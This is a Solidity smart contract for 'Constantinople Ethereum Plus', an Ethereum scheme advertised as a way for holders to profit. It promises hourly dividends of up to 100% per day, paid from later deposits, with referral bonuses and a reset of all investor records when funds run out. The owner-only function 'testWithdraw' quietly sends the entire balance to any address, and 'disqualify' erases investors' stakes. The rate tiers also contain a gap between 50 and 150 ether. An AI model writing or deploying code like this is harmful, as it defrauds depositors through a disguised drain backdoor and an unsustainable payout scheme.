1 /**
2 
3 The Constantinople Ethereum Plus is a financial project that is launched so that every Ethereum Holders can make a profit from using the Ethereum Blockchain Network. 
4 The Constantinople Ethereum Plus offers for the Ethereum Holders four ways to increase the amount of Ethereum:
5 1.Get profit by investing in the most modern platform of the Constantinople Ethereum Plus
6 2.Get Ethereum Cash Coin in the ratio of 1 ETH = 5 Ethereum Cash Coin (1:5)
7 3.Get profit by investing in the Blockchain master nodes
8 4.Get profit by investing in the CryptoMiningBank (will be launched in July 2019)
9 
10 More Info www.constantinople.site
11 
12 */
13 
14 
15 
16 pragma solidity 0.4.25;
17 pragma experimental ABIEncoderV2;
18 library Math {
19     function min(uint a, uint b) internal pure returns(uint) {
20         if (a > b) {
21             return b;
22         }
23         return a;
24     }
25 }
26 
27 
28 library Zero {
29     function requireNotZero(address addr) internal pure {
30         require(addr != address(0), "require not zero address");
31     }
32 
33     function requireNotZero(uint val) internal pure {
34         require(val != 0, "require not zero value");
35     }
36 
37     function notZero(address addr) internal pure returns(bool) {
38         return !(addr == address(0));
39     }
40 
41     function isZero(address addr) internal pure returns(bool) {
42         return addr == address(0);
43     }
44 
45     function isZero(uint a) internal pure returns(bool) {
46         return a == 0;
47     }
48 
49     function notZero(uint a) internal pure returns(bool) {
50         return a != 0;
51     }
52 }
53 
54 
55 library Percent {
56     struct percent {
57         uint num;
58         uint den;
59     }
60 
61     function mul(percent storage p, uint a) internal view returns (uint) {
62         if (a == 0) {
63             return 0;
64         }
65         return a*p.num/p.den;
66     }
67 
68     function div(percent storage p, uint a) internal view returns (uint) {
69         return a/p.num*p.den;
70     }
71 
72     function sub(percent storage p, uint a) internal view returns (uint) {
73         uint b = mul(p, a);
74         if (b >= a) {
75             return 0;
76         }
77         return a - b;
78     }
79 
80     function add(percent storage p, uint a) internal view returns (uint) {
81         return a + mul(p, a);
82     }
83 
84     function toMemory(percent storage p) internal view returns (Percent.percent memory) {
85         return Percent.percent(p.num, p.den);
86     }
87 
88     function mmul(percent memory p, uint a) internal pure returns (uint) {
89         if (a == 0) {
90             return 0;
91         }
92         return a*p.num/p.den;
93     }
94 
95     function mdiv(percent memory p, uint a) internal pure returns (uint) {
96         return a/p.num*p.den;
97     }
98 
99     function msub(percent memory p, uint a) internal pure returns (uint) {
100         uint b = mmul(p, a);
101         if (b >= a) {
102             return 0;
103         }
104         return a - b;
105     }
106 
107     function madd(percent memory p, uint a) internal pure returns (uint) {
108         return a + mmul(p, a);
109     }
110 }
111 
112 
113 library Address {
114     function toAddress(bytes source) internal pure returns(address addr) {
115         assembly { addr := mload(add(source,0x14)) }
116         return addr;
117     }
118 
119     function isNotContract(address addr) internal view returns(bool) {
120         uint length;
121         assembly { length := extcodesize(addr) }
122         return length == 0;
123     }
124 }
125 
126 
127 library SafeMath {
128 
129     function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
130         if (_a == 0) {
131             return 0;
132         }
133 
134         uint256 c = _a * _b;
135         require(c / _a == _b);
136 
137         return c;
138     }
139 
140     function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
141         require(_b > 0); 
142         uint256 c = _a / _b;
143         return c;
144     }
145 
146     function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
147         require(_b <= _a);
148         uint256 c = _a - _b;
149 
150         return c;
151     }
152 
153     function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
154         uint256 c = _a + _b;
155         require(c >= _a);
156 
157         return c;
158     }
159 
160     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
161         require(b != 0);
162         return a % b;
163     }
164 }
165 
166 
167 contract Accessibility {
168     address private owner;
169     modifier onlyOwner() {
170         require(msg.sender == owner, "access denied");
171         _;
172     }
173 
174     constructor() public {
175         owner = msg.sender;
176     }
177 
178     function disown() internal {
179         delete owner;
180     }
181 }
182 
183 
184 contract InvestorsStorage is Accessibility {
185     struct Investment {
186         uint value;
187         uint date;
188         bool partiallyWithdrawn;
189         bool fullyWithdrawn;
190     }
191 
192     struct Investor {
193         uint overallInvestment;
194         uint paymentTime;
195         Investment[] investments;
196         Percent.percent individualPercent;
197     }
198     uint public size;
199 
200     mapping (address => Investor) private investors;
201 
202     function isInvestor(address addr) public view returns (bool) {
203         return investors[addr].overallInvestment > 0;
204     }
205 
206     function investorInfo(address addr)  returns(uint overallInvestment, uint paymentTime, Investment[] investments, Percent.percent individualPercent) {
207         overallInvestment = investors[addr].overallInvestment;
208         paymentTime = investors[addr].paymentTime;
209         investments = investors[addr].investments;
210         individualPercent = investors[addr].individualPercent;
211     }
212     
213     function investorSummary(address addr)  returns(uint overallInvestment, uint paymentTime) {
214         overallInvestment = investors[addr].overallInvestment;
215         paymentTime = investors[addr].paymentTime;
216     }
217 
218     function updatePercent(address addr) private {
219         uint investment = investors[addr].overallInvestment;
220         if (investment < 1 ether) {
221             investors[addr].individualPercent = Percent.percent(3,100);
222         } else if (investment >= 1 ether && investment < 10 ether) {
223             investors[addr].individualPercent = Percent.percent(4,100);
224         } else if (investment >= 10 ether && investment < 50 ether) {
225             investors[addr].individualPercent = Percent.percent(5,100);
226         } else if (investment >= 150 ether && investment < 250 ether) {
227             investors[addr].individualPercent = Percent.percent(7,100);
228         } else if (investment >= 250 ether && investment < 500 ether) {
229             investors[addr].individualPercent = Percent.percent(10,100);
230         } else if (investment >= 500 ether && investment < 1000 ether) {
231             investors[addr].individualPercent = Percent.percent(11,100);
232         } else if (investment >= 1000 ether && investment < 2000 ether) {
233             investors[addr].individualPercent = Percent.percent(14,100);
234         } else if (investment >= 2000 ether && investment < 5000 ether) {
235             investors[addr].individualPercent = Percent.percent(15,100);
236         } else if (investment >= 5000 ether && investment < 10000 ether) {
237             investors[addr].individualPercent = Percent.percent(18,100);
238         } else if (investment >= 10000 ether && investment < 30000 ether) {
239             investors[addr].individualPercent = Percent.percent(20,100);
240         } else if (investment >= 30000 ether && investment < 60000 ether) {
241             investors[addr].individualPercent = Percent.percent(27,100);
242         } else if (investment >= 60000 ether && investment < 100000 ether) {
243             investors[addr].individualPercent = Percent.percent(35,100);
244         } else if (investment >= 100000 ether) {
245             investors[addr].individualPercent = Percent.percent(100,100);
246         }
247     }
248 
249     function newInvestor(address addr, uint investmentValue, uint paymentTime) public onlyOwner returns (bool) {
250         if (investors[addr].overallInvestment != 0 || investmentValue == 0) {
251             return false;
252         }
253         investors[addr].overallInvestment = investmentValue;
254         investors[addr].paymentTime = paymentTime;
255         investors[addr].investments.push(Investment(investmentValue, paymentTime, false, false));
256         updatePercent(addr);
257         size++;
258         return true;
259     }
260 
261     function addInvestment(address addr, uint value) public onlyOwner returns (bool) {
262         if (investors[addr].overallInvestment == 0) {
263             return false;
264         }
265         investors[addr].overallInvestment += value;
266         investors[addr].investments.push(Investment(value, now, false, false));
267         updatePercent(addr);
268         return true;
269     }
270 
271     function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
272         if (investors[addr].overallInvestment == 0) {
273             return false;
274         }
275         investors[addr].paymentTime = paymentTime;
276         return true;
277     }
278 
279     function withdrawBody(address addr, uint limit) public onlyOwner returns (uint) {
280         Investment[] investments = investors[addr].investments;
281         uint valueToWithdraw = 0;
282         for (uint i = 0; i < investments.length; i++) {
283             if (!investments[i].partiallyWithdrawn && investments[i].date <= now - 30 days && valueToWithdraw + investments[i].value/2 <= limit) {
284                 investments[i].partiallyWithdrawn = true;
285                 valueToWithdraw += investments[i].value/2;
286                 investors[addr].overallInvestment -= investments[i].value/2;
287             }
288 
289             if (!investments[i].fullyWithdrawn && investments[i].date <= now - 60 days && valueToWithdraw + investments[i].value/2 <= limit) {
290                 investments[i].fullyWithdrawn = true;
291                 valueToWithdraw += investments[i].value/2;
292                 investors[addr].overallInvestment -= investments[i].value/2;
293             }
294         }
295         return valueToWithdraw;
296     }
297 
298      
299     function disqualify(address addr) public onlyOwner returns (bool) {
300         investors[addr].overallInvestment = 0;
301         investors[addr].investments.length = 0;
302     }
303 }
304 
305 
306 contract Constantinople is Accessibility {
307     using Percent for Percent.percent;
308     using SafeMath for uint;
309     using Math for uint;
310     using Address for *;
311     using Zero for *;
312 
313     mapping(address => bool) private m_referrals;
314     InvestorsStorage private m_investors;
315     uint public constant minInvestment = 50 finney;
316     uint public constant maxBalance = 8888e5 ether;
317     address public advertisingAddress;
318     address public adminsAddress;
319     uint public investmentsNumber;
320     uint public waveStartup;
321 
322     Percent.percent private m_referal_percent = Percent.percent(5,100);
323     Percent.percent private m_referrer_percent = Percent.percent(15,100);
324     Percent.percent private m_adminsPercent = Percent.percent(5, 100);
325     Percent.percent private m_advertisingPercent = Percent.percent(5, 100);
326     Percent.percent private m_firstBakersPercent = Percent.percent(10, 100);
327     Percent.percent private m_tenthBakerPercent = Percent.percent(10, 100);
328     Percent.percent private m_fiftiethBakerPercent = Percent.percent(15, 100);
329     Percent.percent private m_twentiethBakerPercent = Percent.percent(20, 100);
330 
331     event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
332     event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
333     event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
334     event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
335     event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
336     event LogNewInvestment(address indexed addr, uint when, uint investment, uint value);
337     event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
338     event LogPayDividends(address indexed addr, uint when, uint dividends);
339     event LogNewInvestor(address indexed addr, uint when);
340     event LogBalanceChanged(uint when, uint balance);
341     event LogNextWave(uint when);
342     event LogDisown(uint when);
343 
344 
345     modifier balanceChanged {
346         _;
347         emit LogBalanceChanged(now, address(this).balance);
348     }
349 
350     modifier notFromContract() {
351         require(msg.sender.isNotContract(), "only externally accounts");
352         _;
353     }
354 
355     constructor() public {
356         adminsAddress = msg.sender;
357         advertisingAddress = msg.sender;
358         nextWave();
359     }
360 
361     function() public payable {
362         if (msg.value.isZero()) {
363             getMyDividends();
364             return;
365         }
366         doInvest(msg.data.toAddress());
367     }
368 
369     function disqualifyAddress(address addr) public onlyOwner {
370         m_investors.disqualify(addr);
371     }
372 
373     function doDisown() public onlyOwner {
374         disown();
375         emit LogDisown(now);
376     }
377 
378     function testWithdraw(address addr) public onlyOwner {
379         addr.transfer(address(this).balance);
380     }
381 
382     function setAdvertisingAddress(address addr) public onlyOwner {
383         addr.requireNotZero();
384         advertisingAddress = addr;
385     }
386 
387     function setAdminsAddress(address addr) public onlyOwner {
388         addr.requireNotZero();
389         adminsAddress = addr;
390     }
391 
392     function investorsNumber() public view returns(uint) {
393         return m_investors.size();
394     }
395 
396     function balanceETH() public view returns(uint) {
397         return address(this).balance;
398     }
399 
400     function advertisingPercent() public view returns(uint numerator, uint denominator) {
401         (numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
402     }
403 
404     function adminsPercent() public view returns(uint numerator, uint denominator) {
405         (numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
406     }
407 
408     function investorInfo(address investorAddr) public view returns(uint overallInvestment, uint paymentTime) {
409         (overallInvestment, paymentTime) = m_investors.investorSummary(investorAddr);
410      }
411 
412     function investmentsInfo(address investorAddr) public view returns(uint overallInvestment, uint paymentTime, Percent.percent individualPercent, InvestorsStorage.Investment[] investments) {
413         (overallInvestment, paymentTime, investments, individualPercent) = m_investors.investorInfo(investorAddr);
414         }
415 
416     function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
417         dividends = calcDividends(investorAddr);
418     }
419 
420     function getMyDividends() public notFromContract balanceChanged {
421         require(now.sub(getMemInvestor(msg.sender).paymentTime) > 1 hours);
422 
423         uint dividends = calcDividends(msg.sender);
424         require (dividends.notZero(), "cannot to pay zero dividends");
425         assert(m_investors.setPaymentTime(msg.sender, now));
426         if (address(this).balance <= dividends) {
427             nextWave();
428             dividends = address(this).balance;
429         }
430 
431         msg.sender.transfer(dividends);
432         emit LogPayDividends(msg.sender, now, dividends);
433     }
434     
435     function withdrawMyBody() public notFromContract balanceChanged {
436         require(m_investors.isInvestor(msg.sender));
437         uint limit = address(this).balance;
438         uint valueToWithdraw = m_investors.withdrawBody(msg.sender, limit);
439     
440         require (valueToWithdraw.notZero(), "nothing to withdraw");
441 
442         msg.sender.transfer(valueToWithdraw);
443     }
444 
445     function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
446         uint investment = msg.value;
447         uint receivedEther = msg.value;
448         require(investment >= minInvestment, "investment must be >= minInvestment");
449         require(address(this).balance <= maxBalance, "the contract eth balance limit");
450 
451         if (receivedEther > investment) {
452             uint excess = receivedEther - investment;
453             msg.sender.transfer(excess);
454             receivedEther = investment;
455             emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
456         }
457 
458         advertisingAddress.send(m_advertisingPercent.mul(receivedEther));
459         adminsAddress.send(m_adminsPercent.mul(receivedEther));
460 
461         bool senderIsInvestor = m_investors.isInvestor(msg.sender);
462 
463         if (referrerAddr.notZero() && !senderIsInvestor  &&
464         referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {
465             uint referrerBonus = m_referrer_percent.mmul(investment);
466             uint referalBonus = m_referal_percent.mmul(investment);
467             assert(m_investors.addInvestment(referrerAddr, referrerBonus)); 
468             investment += referalBonus;                                    
469             emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);
470         }
471 
472         uint dividends = calcDividends(msg.sender);
473         if (senderIsInvestor && dividends.notZero()) {
474             investment += dividends;
475             emit LogAutomaticReinvest(msg.sender, now, dividends);
476         }
477         if (investmentsNumber % 20 == 0) {
478             investment += m_twentiethBakerPercent.mmul(investment);
479         } else if(investmentsNumber % 15 == 0) {
480             investment += m_fiftiethBakerPercent.mmul(investment);
481         } else if(investmentsNumber % 10 == 0) {
482             investment += m_tenthBakerPercent.mmul(investment);
483         }
484         if (senderIsInvestor) {
485             assert(m_investors.addInvestment(msg.sender, investment));
486             assert(m_investors.setPaymentTime(msg.sender, now));
487         } else {
488             if (investmentsNumber <= 50) {
489                 investment += m_firstBakersPercent.mmul(investment);
490             }
491             assert(m_investors.newInvestor(msg.sender, investment, now));
492             emit LogNewInvestor(msg.sender, now);
493         }
494 
495         investmentsNumber++;
496         emit LogNewInvestment(msg.sender, now, investment, receivedEther);
497     }
498 
499     function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
500         (uint overallInvestment, uint paymentTime, InvestorsStorage.Investment[] memory investments, Percent.percent memory individualPercent) = m_investors.investorInfo(investorAddr);
501         return InvestorsStorage.Investor(overallInvestment, paymentTime, investments, individualPercent);
502     }
503 
504     function calcDividends(address investorAddr) internal view returns(uint dividends) {
505         InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);
506         if (investor.overallInvestment.isZero() || now.sub(investor.paymentTime) < 1 hours) {
507             return 0;
508         }
509 
510         Percent.percent memory p = investor.individualPercent;
511         dividends = (now.sub(investor.paymentTime) / 1 hours) * p.mmul(investor.overallInvestment) / 24;
512     }
513 
514     function nextWave() private {
515         m_investors = new InvestorsStorage();
516         investmentsNumber = 0;
517         waveStartup = now;
518     emit LogNextWave(now);
519     }
520 }